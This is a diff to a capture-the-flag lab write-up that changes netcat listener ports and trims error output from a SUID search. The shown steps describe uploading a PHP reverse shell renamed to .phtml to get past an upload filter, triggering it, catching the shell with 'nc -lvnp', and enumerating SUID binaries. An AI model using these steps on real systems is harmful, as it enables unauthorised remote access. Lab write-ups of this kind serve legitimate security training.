@@ -125,7 +125,7 @@ Found: http://10.10.97.149:3333/internal/ (a upload page)
 #### Reverse shell
 
 ```
-nc -lvnp 5050
+nc -lvnp 4444
 ```
 
 Upload the malicious php (reverse-shell.php)
@@ -154,7 +154,7 @@ To gain remote access to this machine, follow these steps:
 
 2. Rename this file to php-reverse-shell.phtml
 
-3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234
+3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 4444
 
 4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload
 
@@ -242,11 +242,6 @@ find / -type f -perm -4000
 /bin/systemctl
 /bin/ping
 /bin/fusermount
-find: '/tmp/systemd-private-470cb7a54f464109ba15d8dab6b1eda6-systemd-timesyncd.service-Asxa3Z': Permission denied
-find: '/sys/fs/fuse/connections/39': Permission denied
-find: '/sys/kernel/debug': Permission denied
-/sbin/mount.cifs
-find: '/root': Permission denied
 ```
 
 
